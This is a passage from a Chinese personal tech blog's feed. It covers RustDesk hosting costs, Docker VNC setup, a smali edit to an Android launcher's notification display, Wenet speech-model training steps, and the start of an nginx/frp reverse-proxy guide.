src="https://wu1015-images.pages.dev/imgs/Rustdesk-Nginx-Err/%E6%88%AA%E5%9B%BE_2024-09-27_16-27-59.png" alt="费用图片"></li><li>具体部署教程我就不写了，毕竟啥也不用做，跟着人家教程来就是了。</li></ul><h3 id="使用几天后的体验"><a href="#使用几天后的体验" class="headerlink" title="使用几天后的体验"></a>使用几天后的体验</h3><ul><li>第一天部署之后的体验还是不错的，速度还行，虽然画面延迟比较高，但又不是不能用</li><li>部署三天体验，每天的费用在0.2-0.6之间，这是在应用暂停的状态下。开启的话可能是在0.7-0.9之间。也就是说如果暂停使用每天大概0.5，如果使用的话每天大概1。</li><li>然后看了下费用详情（在部署前就该看的），运算资源的费用很低，在0.1-0.2左右，但网络地址的费用较高，在0.6-0.7左右，使用了4个端口地址。<br><img src="https://wu1015-images.pages.dev/imgs/Rustdesk-Nginx-Err/%E6%88%AA%E5%9B%BE_2024-09-29_08-42-22.png" alt="Rustdesk应用部署费用"></li><li>有个比较大的槽点就是服务器的选择不同会影响应用中心的显示。比如选择的是新加坡服务器，那么北京服务器创建的应用就无法在应用管理中显示。</li></ul><h3 id="总的来说"><a href="#总的来说" class="headerlink" title="总的来说"></a>总的来说</h3><ul><li>如果是即用即开，不用就删，那性价比还可以。但如果是即用即开，不用就暂停的话还不如购买内网穿透服务或者买个便宜的服务器。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这是一次失败的配置，主要是因为需求和实际冲突了。&lt;/li&gt;
&lt;li&gt;需求：部署在内网服务器，通过Nginx反代到内网穿透的一个端</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Rustdesk" scheme="http://wu1015.github.io/tags/Rustdesk/"/>
    
    <category term="SealOS" scheme="http://wu1015.github.io/tags/SealOS/"/>
    
  </entry>
  
  <entry>
    <title>在docker配置vnc连接</title>
    <link href="http://wu1015.github.io/2024/09/14/docker-with-vnc/"/>
    <id>http://wu1015.github.io/2024/09/14/docker-with-vnc/</id>
    <published>2024-09-14T08:49:31.000Z</published>
    <updated>2024-12-23T02:22:13.728Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vnc配置前的准备"><a href="#vnc配置前的准备" class="headerlink" title="vnc配置前的准备"></a>vnc配置前的准备</h2><h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><ul><li>这一步比较关键，要注意启动的镜像的版本。我们这里以Ubuntu举例，如果高于<code>22.04</code>，就必须加入参数<code>--security-opt seccomp=unconfined</code>。否则会出问题。在下述启动命令中，指定使用主机所有gpu资源，命名为wu1015_test，将容器5901端口映射到本地的32789。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run  --gpus all  --ipc=host --name wu1015_test --security-opt seccomp=unconfined -it -p  32789:5901 镜像id</span><br></pre></td></tr></table></figure></li></ul><h3 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h3><ul><li><p>建议不要使用<code>root</code>用户进行配置，建议新建一个用户避免出现一些问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser wu</span><br></pre></td></tr></table></figure></li><li><p>授予<code>sudo</code>权限。没有<code>sudo</code>的话就下一个<code>apt install sudo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usermod -aG sudo wu</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置vnc"><a href="#配置vnc" class="headerlink" title="配置vnc"></a>配置vnc</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><ul><li><p>安装x11</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install xorg openbox</span><br></pre></td></tr></table></figure></li><li><p>安装xfce桌面环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install xfce4 xfce4-goodies vim</span><br></pre></td></tr></table></figure></li><li><p>安装<code>tightvncserver</code>，这个地方要注意的是，这个是新的vnc，旧的是vnc4server好像。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install tightvncserver</span><br></pre></td></tr></table></figure></li></ul><p>&#x2F;&#x2F; todo x11vnc</p><h3 id="vnc配置"><a href="#vnc配置" class="headerlink" title="vnc配置"></a>vnc配置</h3><ul><li><p>启动vnc并关闭以生成配置文件。第一次启动会要求输入一个密码，不要太长。第二个选项选择<code>n</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vncserver :1</span><br><span class="line"></span><br><span class="line">vncserver -kill :1</span><br></pre></td></tr></table></figure></li><li><p>编辑启动文件。启动文件，顾名思义，在连接时加载的文件，可以在里面加入一些启动参数，比如<code>thunar</code>就可以启动xfce自带的文件管理器了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.vnc/xstartup</span><br></pre></td></tr></table></figure></li><li><p>全部删除并添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">unset SESSION_MANAGER</span><br><span class="line">unset DBUS_SESSION_BUS_ADDRESS</span><br><span class="line">#openbox-session &amp;</span><br><span class="line">xrdb $HOME/.Xresources</span><br><span class="line">startxfce4 &amp;</span><br></pre></td></tr></table></figure></li><li><p>给予启动权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ~/.vnc/xstartup</span><br></pre></td></tr></table></figure></li><li><p>如果启动成功会回报</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">New &#x27;X&#x27; desktop is 4f09a4c66740:1</span><br><span class="line"></span><br><span class="line">Starting applications specified in /home/wu/.vnc/xstartup</span><br><span class="line">Log file is /home/wu/.vnc/4f09a4c66740:1.log</span><br></pre></td></tr></table></figure></li></ul><h2 id="可能出现的一些问题以及解决方法"><a href="#可能出现的一些问题以及解决方法" class="headerlink" title="可能出现的一些问题以及解决方法"></a>可能出现的一些问题以及解决方法</h2><ul><li><p>如果找不到<code>display</code>可以选择配置一个环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export DISPLAY=:1</span><br></pre></td></tr></table></figure></li><li><p>如果在vnc连接之后没办法输入可以通过<code>xev</code>检测。在服务器端输入<code>xev</code>就可以在vnc那开一个窗口用于检测输入，包括鼠标和键盘。</p></li><li><p>报错<code>failed to close file descriptor for child process(Operation not permitted)</code>。就是前面的那个问题，用的镜像影视ubuntu22.04。使用<code>--security-opt seccomp=unconfined</code>参数重新启动镜像。</p></li><li><p>灰屏黑屏问题的解决方法同上。</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://www.cnblogs.com/limstorm/p/17320144.html">Ubuntu20.04 Docker搭建远程xfce桌面以及ssh教程</a></li><li><a href="https://blog.csdn.net/Robert_Q/article/details/127376171">使用VNC可视化Docker容器</a></li><li><a href="https://gist.github.com/nathabonfim59/b088db8752673e1e7acace8806390242">How to fix the “Failed to close file descriptor for child process (Operation not permitted)” in your docker ci build</a></li><li><a href="https://forums.docker.com/t/solved-docker-vnc-grey-screen-only-with-ubuntu-22-04-image/140108">[SOLVED] Docker VNC grey screen (only with ubuntu 22.04 image)</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;vnc配置前的准备&quot;&gt;&lt;a href=&quot;#vnc配置前的准备&quot; class=&quot;headerlink&quot; title=&quot;vnc配置前的准备&quot;&gt;&lt;/a&gt;vnc配置前的准备&lt;/h2&gt;&lt;h3 id=&quot;启动容器&quot;&gt;&lt;a href=&quot;#启动容器&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="岁月的史书" scheme="http://wu1015.github.io/categories/%E5%B2%81%E6%9C%88%E7%9A%84%E5%8F%B2%E4%B9%A6/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
    <category term="Docker" scheme="http://wu1015.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Aris终端桌面安卓逆向记录</title>
    <link href="http://wu1015.github.io/2024/09/09/aris-launcher-reverse/"/>
    <id>http://wu1015.github.io/2024/09/09/aris-launcher-reverse/</id>
    <published>2024-09-09T01:50:12.000Z</published>
    <updated>2024-12-23T02:17:18.060Z</updated>
    
    <content type="html"><![CDATA[<h2 id="逆向记录"><a href="#逆向记录" class="headerlink" title="逆向记录"></a>逆向记录</h2><h3 id="软件说明"><a href="#软件说明" class="headerlink" title="软件说明"></a>软件说明</h3><ul><li>软件名称与版本号：Aris终端桌面1.1.62</li><li>想要修改的地方：通知显示只有开启点击之后才会显示<code>title: context</code>，不开启只能显示<code>context</code>，不太符合直觉。因而将其修改为一样的。</li></ul><h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><ul><li>这个软件没有加固，也就没有脱壳这个步骤了。</li></ul><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><ul><li>这一步完全可以用<code>MT管理器</code>来改，但我不太想在手机上弄。</li></ul><h4 id="安装apktool"><a href="#安装apktool" class="headerlink" title="安装apktool"></a>安装apktool</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install apktool</span><br></pre></td></tr></table></figure><h4 id="进行反编译"><a href="#进行反编译" class="headerlink" title="进行反编译"></a>进行反编译</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d 应用.apk</span><br></pre></td></tr></table></figure><h3 id="转Java"><a href="#转Java" class="headerlink" title="转Java"></a>转Java</h3><ul><li>很久没看smali了，还是java看着舒服，所以转换到java相对方便一点。</li></ul><h4 id="安装dex2jar"><a href="#安装dex2jar" class="headerlink" title="安装dex2jar"></a>安装dex2jar</h4><ul><li><p>下载源码到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pxb1988/dex2jar.git</span><br></pre></td></tr></table></figure></li><li><p>编译。编译后会在<code>dex-tools/build/distributions</code>生成一个压缩文件，名字为<code>dex-tools</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gradlew distZip</span><br></pre></td></tr></table></figure></li><li><p>解压后进入目录后执行转换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./d2j-dex2jar.sh  应用.apk</span><br><span class="line"></span><br><span class="line">// 或者</span><br><span class="line">./d2j-dex2jar.sh  应用的classes.dex</span><br></pre></td></tr></table></figure></li></ul><h3 id="修改Smali并回编译"><a href="#修改Smali并回编译" class="headerlink" title="修改Smali并回编译"></a>修改Smali并回编译</h3><h4 id="使用JD-GUI查看Java代码"><a href="#使用JD-GUI查看Java代码" class="headerlink" title="使用JD-GUI查看Java代码"></a>使用JD-GUI查看Java代码</h4><ul><li><p>到<a href="https://github.com/java-decompiler/jd-gui/releases/tag/v1.6.6">JD-GUI_releases</a>下载一个<code>.jar</code>的文件。</p></li><li><p>打开文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jd-gui-1.6.6.jar  生成的.jar </span><br></pre></td></tr></table></figure></li></ul><h4 id="修改相关Smali文件"><a href="#修改相关Smali文件" class="headerlink" title="修改相关Smali文件"></a>修改相关Smali文件</h4><ul><li><p>通过jd-gui查找关键词<code>feed</code>，发现在<code>com/shinado/piping/home/ArisLauncher</code>中。</p></li><li><p>分析java代码，在未开启<code>通知可点击</code>功能前只显示<code>context</code>。</p></li><li><p>回到smali中，打开<code>com/shinado/piping/home/ArisLauncher.smali</code>，找到对应的smali代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">const-string v1, &quot;: &quot;</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, p2&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br></pre></td></tr></table></figure></li><li><p>根据分析<code>p1</code>为<code>title</code>，<code>p2</code>为<code>context</code>，因而仿照加一段。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">invoke-virtual &#123;v0, p1&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br></pre></td></tr></table></figure></li><li><p>最后修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">const-string v1, &quot;: &quot;</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, p1&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">const-string v1, &quot;: &quot;</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, v1&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br><span class="line"></span><br><span class="line">invoke-virtual &#123;v0, p2&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line"></span><br><span class="line">move-result-object v0</span><br></pre></td></tr></table></figure></li><li><p>回编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b 应用文件夹</span><br></pre></td></tr></table></figure></li></ul><h3 id="签名安装"><a href="#签名安装" class="headerlink" title="签名安装"></a>签名安装</h3><ul><li>这部分我比较倾向于用<code>MT管理器</code>来签名。</li></ul><h4 id="还存在的问题"><a href="#还存在的问题" class="headerlink" title="还存在的问题"></a>还存在的问题</h4><ul><li>有些通知带有联系人姓名的话会重复显示。比如：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">测试：测试：内容</span><br><span class="line">测试：：内容</span><br></pre></td></tr></table></figure>这部分可能得从源头的调用那地方改，当然在这处理一下字符串应该也行。不过又不是不能用。（手动滑稽）</li></ul><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><ul><li><p>起初我本来用的是<code>1.0.98</code>版本，这个版本可以说我从高中的时候就在使用。一个是因为没有新版那些花里胡哨的功能，二来是占用也比较低。这个桌面的迭代史可以说和QQ几乎一样，从一开始的简洁明了，到后面一大堆功能的加，甚至连最基本的稳定有时候都保障不了。</p></li><li><p>选择<code>1.1.62</code>这个版本也属于无奈之举，但也是最合理的一个版本。</p></li><li><p>网络上能找到的历史版本寥寥，上面的<code>1.0.98</code>用了不少时间才找到的。<code>1.1.62</code>属于是在酷友分享，网络上几乎没有，能找到的也是在一些小网站，不是很能保证下载安全。而且再新一到两个小版本号，很多东西都改了。想当初在<code>Aris终端桌面</code>的官网就能找到全部版本和全部更新日志。但好像从<code>1.2</code>之后就不行了，也许是为了保证用户的付费（没错，从1.2之后就开始需要付费才能使用一些之前版本就能用的功能），也许是为了避免用户流失。但终归是没有了。</p></li><li><p>而且<code>1.0.98</code>在我这个机器似乎有些bug，具体是什么也说不上来，但可能是因为权限之类的问题，经常黑屏死机。（当然也可能是我手机的问题）</p><ul><li>2024.11.14确实是我手机问题，似乎是因为刷入新内核支持zstd的zram之后，就会这样，关闭就没事了。</li><li>当然aris确实需要通讯录权限，不然可能会出问题，1.0.98还是1.1.62都是这样。</li></ul></li><li><p>为什么不用<code>t-ui</code>？因为<code>t-ui</code>在对中文搜索的时候需要切换中文输入法，而且其实我也不太需要对<code>shell</code>的支持，毕竟有<code>termux</code>，所谓术业有专攻。</p></li><li><p>自己会用到的东西还是得好好保存才是，不然就消失在历史的长河中了。</p></li></ul><h2 id="参考文章以及相关资源链接"><a href="#参考文章以及相关资源链接" class="headerlink" title="参考文章以及相关资源链接"></a>参考文章以及相关资源链接</h2><blockquote><ul><li><a href="https://frp-any.top:18514/Onedrive/%E5%BA%94%E7%94%A8/Android/Aris%20-%20Terminal%20Launcher_1.0.98_APKPure.apk">Aris终端桌面1.0.98安装包</a></li><li><a href="https://frp-any.top:18514/Onedrive/%E5%BA%94%E7%94%A8/Android/Aris%E7%BB%88%E7%AB%AF%E6%A1%8C%E9%9D%A2_1.1.62.apk">Aris终端桌面1.1.62安装包</a></li><li><a href="https://frp-any.top:18514/Onedrive/%E5%BA%94%E7%94%A8/Android/Aris%E7%BB%88%E7%AB%AF%E6%A1%8C%E9%9D%A2_1.1.63%E4%BF%AE%E6%94%B9vc_sign.apk">修改后的安装包Aris</a></li><li><a href="https://github.com/pxb1988/dex2jar">dex2jar链接</a></li><li><a href="https://github.com/java-decompiler/jd-gui">jd-gui链接</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;逆向记录&quot;&gt;&lt;a href=&quot;#逆向记录&quot; class=&quot;headerlink&quot; title=&quot;逆向记录&quot;&gt;&lt;/a&gt;逆向记录&lt;/h2&gt;&lt;h3 id=&quot;软件说明&quot;&gt;&lt;a href=&quot;#软件说明&quot; class=&quot;headerlink&quot; title=&quot;软件说明&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="岁月的史书" scheme="http://wu1015.github.io/categories/%E5%B2%81%E6%9C%88%E7%9A%84%E5%8F%B2%E4%B9%A6/"/>
    
    
    <category term="安卓逆向" scheme="http://wu1015.github.io/tags/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>语言识别模型Wenet的基础使用与训练</title>
    <link href="http://wu1015.github.io/2024/08/22/wenet-base-usage/"/>
    <id>http://wu1015.github.io/2024/08/22/wenet-base-usage/</id>
    <published>2024-08-22T00:52:29.000Z</published>
    <updated>2024-12-23T02:47:49.508Z</updated>
    
    <content type="html"><![CDATA[<ul><li>最近在训练<code>Wenet</code>模型，所以顺便记录一下。</li></ul><h2 id="源码流程-以aishell为例"><a href="#源码流程-以aishell为例" class="headerlink" title="源码流程 以aishell为例"></a>源码流程 以aishell为例</h2><ul><li><p>资源下载</p><ul><li>执行以下语句进行下载，下载到<code>/export/data/asr-data/OpenSLR/33/</code>目录中，并进行解压和分类。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage -1 --stop_stage -1</span><br></pre></td></tr></table></figure></li></ul></li><li><p>生成索引文件</p><ul><li>执行<code>local/aishell-data-prep.sh</code>生成索引文件到<code>data/local/&lt;train&gt; &lt;dev&gt; &lt;test&gt;</code>中，然后再把<code>text</code>和<code>wav.scp</code>两个文件复制到<code>data/&lt;train&gt; &lt;dev&gt; &lt;test&gt;</code>三个文件夹中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 0 --stop_stage 0</span><br></pre></td></tr></table></figure></li></ul></li><li><p>归一化计算</p><ul><li>先将<code>text</code>进行备份，备份为<code>text.org</code></li><li>分离<code>text</code>中的元素，后半部分去掉空格，再与前半部分合并（空格隔开）</li><li>进行归一化计算（CMVN）</li><li>删除备份文件<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 1 --stop_stage 1</span><br></pre></td></tr></table></figure></li></ul></li><li><p>生成字典</p><ul><li>生成data.list字典，格式为<code>&#123;&quot;key&quot;:wav的id, &quot;wav&quot;: wav的绝对路径, &quot;txt&quot;: 文字&#125;</code>。在训练时调用这个字典文件进行训练。模型测试时同理。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 2 --stop_stage 2</span><br></pre></td></tr></table></figure></li></ul></li><li><p>格式化，数据打包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 3 --stop_stage 3</span><br></pre></td></tr></table></figure></li><li><p>模型训练</p><ul><li>读取配置文件中的信息，输出到<code>exp/conformer</code>，也就是说，这里面的文件都是生成的，而非源文件。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 4 --stop_stage 4</span><br></pre></td></tr></table></figure></li></ul></li><li><p>模型评价</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 5 --stop_stage 5</span><br></pre></td></tr></table></figure></li><li><p>模型导出</p><ul><li>导出WeNet模型为TorchScript格式<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 6 --stop_stage 6</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="注意事项-以aishell为例"><a href="#注意事项-以aishell为例" class="headerlink" title="注意事项 以aishell为例"></a>注意事项 以aishell为例</h2><h3 id="对应文件夹的创建"><a href="#对应文件夹的创建" class="headerlink" title="对应文件夹的创建"></a>对应文件夹的创建</h3><ul><li>因为脚本并没有执行<code>mkdir -p</code>之类的命令，因此有一些文件夹需要自己手动创建，否则会出现报错。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /export/data/asr-data/OpenSLR/33/</span><br><span class="line">mkdir -p data/test/</span><br><span class="line">mkdir -p data/train/</span><br><span class="line">mkdir -p data/dev/</span><br><span class="line">ls</span><br></pre></td></tr></table></figure></li></ul><h3 id="导出权重"><a href="#导出权重" class="headerlink" title="导出权重"></a>导出权重</h3><ul><li>如果是用的<code>jupyter notebook</code>的话，不要直接下载，否则会得到一个<code>.ptrom</code>的文件，应该直接执行压缩之后再下来下来。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf 输出文件 源文件</span><br></pre></td></tr></table></figure></li></ul><h2 id="其他说明"><a href="#其他说明" class="headerlink" title="其他说明"></a>其他说明</h2><h3 id="使用自己的数据集进行训练"><a href="#使用自己的数据集进行训练" class="headerlink" title="使用自己的数据集进行训练"></a>使用自己的数据集进行训练</h3><h4 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h4><ul><li>首先是数据集准备，将数据集转换为<code>text</code>和<code>wav.scp</code>两个文件。</li><li>其中<code>text</code>为<code>wav名称 语句</code>。注意中间是空格隔开。</li><li><code>wav.scp</code>为<code>wav名称 wav绝对路径</code>。注意中间是空格隔开。</li></ul><h4 id="开始训练"><a href="#开始训练" class="headerlink" title="开始训练"></a>开始训练</h4><ul><li><p>跳过数据准备的前几步，直接从归一化计算开始跑。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 1 --stop_stage 1</span><br></pre></td></tr></table></figure></li><li><p>载入训练</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 4 --stop_stage 4 --checkpoint exp/conformer/avg_30.pt</span><br></pre></td></tr></table></figure></li></ul><h3 id="保存训练日志"><a href="#保存训练日志" class="headerlink" title="保存训练日志"></a>保存训练日志</h3><ul><li>执行模型训练时加上记录语句（其他同理）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./run.sh --stage 4 --stop_stage 4 | tee  ls.txt</span><br><span class="line">// 或 但这样不会输出在终端上</span><br><span class="line">./run.sh --stage 4 --stop_stage 4 &gt; ls.txt</span><br><span class="line"></span><br><span class="line">// 增量写入</span><br><span class="line">./run.sh --stage 4 --stop_stage 4 | tee  -a ls.txt</span><br><span class="line">// 或 但这样不会输出在终端上</span><br><span class="line">./run.sh --stage 4 --stop_stage 4 &gt;&gt; ls.txt</span><br></pre></td></tr></table></figure></li></ul><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><ul><li>注意观察<code>run.sh</code>，发现训练的配置文件为<code>conf/train_conformer.yaml</code>。训练时如果数据量过大可以在此修改<code>batch_size</code>。可以改固定值，也可以改为动态。当然也可以在这里改迭代次数。</li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://speech.xmu.edu.cn/2020/0630/c18207a406063/page.htm">厦门大学 语音识别：原理与应用 </a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;ul&gt;
&lt;li&gt;最近在训练&lt;code&gt;Wenet&lt;/code&gt;模型，所以顺便记录一下。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;源码流程-以aishell为例&quot;&gt;&lt;a href=&quot;#源码流程-以aishell为例&quot; class=&quot;headerlink&quot; title=&quot;源码流程 以</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="人工智能" scheme="http://wu1015.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
    <category term="Wenet" scheme="http://wu1015.github.io/tags/Wenet/"/>
    
  </entry>
  
  <entry>
    <title>使用nginx进行端口转发实现frp内网穿透端口的多重利用</title>
    <link href="http://wu1015.github.io/2024/08/21/frp-with-nginx/"/>
    <id>http://wu1015.github.io/2024/08/21/frp-with-nginx/</id>
    <published>2024-08-21T00:41:44.000Z</published>
    <updated>2024-12-23T02:22:45.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><ul><li>因为宽带没有公网ip，而买一个云服务器又太过费钱。因而选择了使用内网穿透，而内网穿透我比较熟悉的厂商也就是<code>SakuraFRP</code>了。</li><li>但内网穿透的免费隧道只有两条，挂个<code>alist</code>是绰绰有余的，但我还想挂其他服务。这么看来两条隧道显然是不够用，于是我想到了nginx反向代理。</li><li>通过反向代理监听本地端口实现子目录的不同服务访问。</li></ul><h2 id="下载应用"><a href="#下载应用" class="headerlink" title="下载应用"></a>下载应用</h2><ul><li>安装<code>nginx</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure></li></ul><h2 id="配置反向代理"><a href="#配置反向代理" class="headerlink" title="配置反向代理"></a>配置反向代理</h2><h3 id="frp修改映射的端口"><a href="#frp修改映射的端口" class="headerlink" title="frp修改映射的端口"></a>frp修改映射的端口</h3><ul><li>因为本文中用的是SakuraFRP，所以直接去网页那修改一下（本文是改为<code>10086</code>）然后重启frpc就行了。</li></ul><h3 id="添加反向代理文件"><a 